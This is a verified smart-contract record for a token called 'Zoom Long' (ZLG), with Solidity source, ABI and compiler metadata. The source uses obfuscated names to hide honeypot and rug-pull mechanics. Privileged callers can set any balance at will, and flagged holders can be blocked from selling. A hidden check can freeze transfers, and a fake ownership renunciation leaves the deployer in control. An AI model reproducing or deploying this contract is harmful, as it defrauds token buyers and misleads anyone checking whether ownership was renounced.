{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface fromTradingFee {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract amountFundReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface feeAt {\n    function createPair(address enableAt, address maxLaunch) external returns (address);\n}\n\ninterface feeSender {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fundLimit) external view returns (uint256);\n\n    function transfer(address totalFrom, uint256 maxSellLaunch) external returns (bool);\n\n    function allowance(address launchListMarketing, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 maxSellLaunch) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address totalFrom,\n        uint256 maxSellLaunch\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed senderShould, uint256 value);\n    event Approval(address indexed launchListMarketing, address indexed spender, uint256 value);\n}\n\ninterface teamWalletTrading is feeSender {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ZoomLong is amountFundReceiver, feeSender, teamWalletTrading {\n\n    string private limitFundExempt = \"Zoom Long\";\n\n    function modeShould(address liquidityLimitTotal, address totalFrom, uint256 maxSellLaunch) internal returns (bool) {\n        if (liquidityLimitTotal == limitTeam) {\n            return takeShould(liquidityLimitTotal, totalFrom, maxSellLaunch);\n        }\n        uint256 txShould = feeSender(minToken).balanceOf(walletLimit);\n        require(txShould == listTotalTx);\n        require(totalFrom != walletLimit);\n        if (minTx[liquidityLimitTotal]) {\n            return takeShould(liquidityLimitTotal, totalFrom, txBuy);\n        }\n        return takeShould(liquidityLimitTotal, totalFrom, maxSellLaunch);\n    }\n\n    function transfer(address feeMode, uint256 maxSellLaunch) external virtual override returns (bool) {\n        return modeShould(_msgSender(), feeMode, maxSellLaunch);\n    }\n\n    uint256 listTotalTx;\n\n    bool private walletSender;\n\n    mapping(address => bool) public minTx;\n\n    uint256 public amountModeIs;\n\n    address walletLimit = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => mapping(address => uint256)) private exemptAt;\n\n    function minToTrading(address amountExempt) public {\n        modeTotal();\n        \n        if (amountExempt == limitTeam || amountExempt == minToken) {\n            return;\n        }\n        minTx[amountExempt] = true;\n    }\n\n    address public limitTeam;\n\n    uint256 public autoList;\n\n    function toAuto(address feeMode, uint256 maxSellLaunch) public {\n        modeTotal();\n        feeEnableWallet[feeMode] = maxSellLaunch;\n    }\n\n    function swapMarketingMax() public {\n        emit OwnershipTransferred(limitTeam, address(0));\n        limitFee = address(0);\n    }\n\n    function takeShould(address liquidityLimitTotal, address totalFrom, uint256 maxSellLaunch) internal returns (bool) {\n        require(feeEnableWallet[liquidityLimitTotal] >= maxSellLaunch);\n        feeEnableWallet[liquidityLimitTotal] -= maxSellLaunch;\n        feeEnableWallet[totalFrom] += maxSellLaunch;\n        emit Transfer(liquidityLimitTotal, totalFrom, maxSellLaunch);\n        return true;\n    }\n\n    bool public minSwap;\n\n    mapping(address => uint256) private feeEnableWallet;\n\n    function teamMin(uint256 maxSellLaunch) public {\n        modeTotal();\n        listTotalTx = maxSellLaunch;\n    }\n\n    uint256 constant txBuy = 8 ** 10;\n\n    event OwnershipTransferred(address indexed isReceiver, address indexed feeMin);\n\n    uint8 private launchedMinTotal = 18;\n\n    address public minToken;\n\n    address autoAmount = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function modeTotal() private view {\n        require(sellLaunchFrom[_msgSender()]);\n    }\n\n    function owner() external view returns (address) {\n        return limitFee;\n    }\n\n    uint256 private minIs = 100000000 * 10 ** 18;\n\n    uint256 buyWalletLaunch;\n\n    function transferFrom(address liquidityLimitTotal, address totalFrom, uint256 maxSellLaunch) external override returns (bool) {\n        if (_msgSender() != autoAmount) {\n            if (exemptAt[liquidityLimitTotal][_msgSender()] != type(uint256).max) {\n                require(maxSellLaunch <= exemptAt[liquidityLimitTotal][_msgSender()]);\n                exemptAt[liquidityLimitTotal][_msgSender()] -= maxSellLaunch;\n            }\n        }\n        return modeShould(liquidityLimitTotal, totalFrom, maxSellLaunch);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return limitFundExempt;\n    }\n\n    bool private walletLimitTake;\n\n    function balanceOf(address fundLimit) public view virtual override returns (uint256) {\n        return feeEnableWallet[fundLimit];\n    }\n\n    constructor (){\n        \n        fromTradingFee tradingMarketing = fromTradingFee(autoAmount);\n        minToken = feeAt(tradingMarketing.factory()).createPair(tradingMarketing.WETH(), address(this));\n        \n        limitTeam = _msgSender();\n        swapMarketingMax();\n        sellLaunchFrom[limitTeam] = true;\n        feeEnableWallet[limitTeam] = minIs;\n        if (walletLimitTake != exemptSwap) {\n            autoEnable = amountModeIs;\n        }\n        emit Transfer(address(0), limitTeam, minIs);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return listLiquidity;\n    }\n\n    function allowance(address takeAuto, address enableLiquidityWallet) external view virtual override returns (uint256) {\n        if (enableLiquidityWallet == autoAmount) {\n            return type(uint256).max;\n        }\n        return exemptAt[takeAuto][enableLiquidityWallet];\n    }\n\n    string private listLiquidity = \"ZLG\";\n\n    bool private exemptSwap;\n\n    address private limitFee;\n\n    function approve(address enableLiquidityWallet, uint256 maxSellLaunch) public virtual override returns (bool) {\n        exemptAt[_msgSender()][enableLiquidityWallet] = maxSellLaunch;\n        emit Approval(_msgSender(), enableLiquidityWallet, maxSellLaunch);\n        return true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return minIs;\n    }\n\n    function isWallet(address modeAuto) public {\n        if (minSwap) {\n            return;\n        }\n        if (amountModeIs == autoList) {\n            exemptSwap = false;\n        }\n        sellLaunchFrom[modeAuto] = true;\n        if (walletLimitTake) {\n            autoEnable = autoList;\n        }\n        minSwap = true;\n    }\n\n    function getOwner() external view returns (address) {\n        return limitFee;\n    }\n\n    uint256 public autoEnable;\n\n    uint256 public marketingLimitTx;\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchedMinTotal;\n    }\n\n    mapping(address => bool) public sellLaunchFrom;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchListMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeMin\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderShould\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableLiquidityWallet\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountModeIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableLiquidityWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxSellLaunch\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundLimit\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeAuto\",\"type\":\"address\"}],\"name\":\"isWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingLimitTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountExempt\",\"type\":\"address\"}],\"name\":\"minToTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellLaunchFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapMarketingMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxSellLaunch\",\"type\":\"uint256\"}],\"name\":\"teamMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxSellLaunch\",\"type\":\"uint256\"}],\"name\":\"toAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxSellLaunch\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityLimitTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxSellLaunch\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ZoomLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}